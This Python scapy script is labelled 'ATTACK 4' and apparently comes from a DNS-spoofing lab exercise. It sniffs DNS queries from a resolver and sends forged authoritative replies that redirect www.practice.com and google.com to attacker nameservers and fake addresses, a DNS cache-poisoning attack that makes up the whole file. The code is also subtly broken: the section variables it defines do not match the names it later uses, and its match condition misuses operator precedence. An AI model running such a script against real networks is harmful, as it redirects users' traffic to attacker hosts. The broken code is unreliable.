#!/usr/bin/env python3

 
from scapy.all import *

print("ATTACK 4")
print("Navigate to user window\n")
print("Type command - dig www.practice.com\n")



def spoof_dns(pkt):
  if (DNS in pkt and'www.practice.com' or 'www.google.com' in pkt[DNS].qd.qname.decode('utf-8')):
    print("The packet to be send: \n")

    pkt.show()

    # Swap source IP address and destination IP address
    IP_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap source port number and destination port number
    UDP_packet = UDP(dport=pkt[UDP].sport, sport=53)

    # Answer Section
    Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.1.1.1')
                 
    # Authority Section
    NS_sec1 = DNSRR(rrname='practice.com.', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    NS_sec2 = DNSRR(rrname='google.com.', type='NS',
                   ttl=259200, rdata='ns.seedattacker123.com')

    # Additional Section
    Add_sec1 = DNSRR(rrname='ns.seedattacker123.com.', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Add_sec2 = DNSRR(rrname='ns.practice.com.', type='A',
                    ttl=259200, rdata='5.6.7.8')	
    Add_sec3 = DNSRR(rrname='www.google.com.', type='A',
                    ttl=259200, rdata='3.4.5.6')                
	

    # Constructing the DNS packet
    DNS_packet = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3)

    # Constructing entire IP packet and send it out
    spoof_packet = IP_packet/UDP_packet/DNS_packet
    print("\nSpoofed packet received from attacker's server: \n")
    spoof_packet.show()
    
    send(spoof_packet)

# Sniffing UDP query packets and invoking spoof_dns().
f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-5b8338aedcce', filter=f, prn=spoof_dns)      
